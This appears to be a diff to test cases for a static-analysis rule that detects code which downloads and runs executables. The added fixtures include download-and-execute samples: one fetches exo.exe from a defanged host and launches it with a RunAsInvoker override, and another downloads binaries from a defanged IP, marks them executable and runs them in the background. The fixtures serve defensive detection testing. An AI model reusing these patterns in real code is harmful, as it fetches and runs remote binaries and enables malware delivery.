@@ -29,8 +29,8 @@ def f():
         connection.request("GET", PATH)
         response = connecton.getresponse().read()
     os.chdir(os.path.expanduser("~"))
-    # ruleid: download-executable
     d = open(LOC, "wb")
+    # ruleid: download-executable
     d.write(response)
     d.close()
     current_state = os.stat(LOC)
@@ -103,3 +103,45 @@ def f():
     # ok: download-executable
     urllib.request.urlretrieve("https://www.google.com/robots.txt", "robots.txt")
     os.rename("robots.txt", "roboto.txt")
+
+""" RULE ID: Downloads and creates an .exe
+"""
+def f():
+    import os
+    import requests
+   
+    URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
+    response = requests.get(URL)
+    # ruleid: download-executable
+    open("exo.exe", "wb").write(response.content)
+    os.system("set __COMPACT_LAYER=RunAsInvoker | start exo.exe")
+
+""" OK: Downloads harmless file and references it
+"""
+def f():
+    import os
+    import requests
+   
+    URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
+    response = requests.get(URL)
+    # ok: download-executable
+    open("exo.txt", "wb").write(response.content)
+    os.system("echo exo.txt")
+
+def f():
+    for executable in all_executables:
+        url = f'http://35.235.126[.]33/{executable}'
+        req = requests.get(url)
+        # ruleid: download-executable
+        with open(executable, 'wb') as f:
+            f.write(req.content)
+
+        if 'linux' in operating_system or 'darwin' in operating_system:
+            os.system(f'chmod +x {executable}')
+
+        if 'linux' in operating_system:
+            os.system(f'./{executable} &')
+        elif 'darwin' in operating_system:
+            os.system(f'./{executable} &')
+        elif 'windows' in operating_system:
+            os.system(f'start /B {executable}')
